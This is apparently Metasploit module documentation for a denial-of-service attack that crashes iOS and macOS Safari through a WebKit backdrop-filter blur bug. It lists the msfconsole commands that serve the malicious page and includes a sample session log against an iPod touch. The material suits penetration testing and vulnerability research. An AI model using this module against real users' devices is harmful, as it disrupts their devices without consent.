## Vulnerable Application

This module exploits a vulnerability in Safari WebKit to crash the device.
The bug affects all iOS devices running iOS 9 up to iOS 12 and Safari on OSX 10.13.6

The device will "re-spring" the operating system, but not actually restart the device.

## Verification Steps

1. Start msfconsole
1. Do: `use auxiliary/dos/apple_ios/webkit_backdrop_filter_blur`
1. Do: `set URIPATH /` (Optional)
1. Do: `run`
1. When you visit the page on a vulnerable device, it should crash the operating system

## Scenarios

### Safari 602.1 on iOS 10.1.1

```
msf5 > use auxiliary/dos/apple_ios/webkit_backdrop_filter_blur
msf5 auxiliary(dos/apple_ios/webkit_backdrop_filter_blur) > set URIPATH /
URIPATH => /
msf5 auxiliary(dos/apple_ios/webkit_backdrop_filter_blur) > run

[*] Using URL: http://0.0.0.0:8080/
[*] Local IP: http://192.168.0.1:8080/
[*] Server started.
[*] 192.168.0.2: Sending response to User-Agent: Mozilla/5.0 (iPod touch; CPU iPhone OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0 Mobile/14B150 Safari/602.1

```
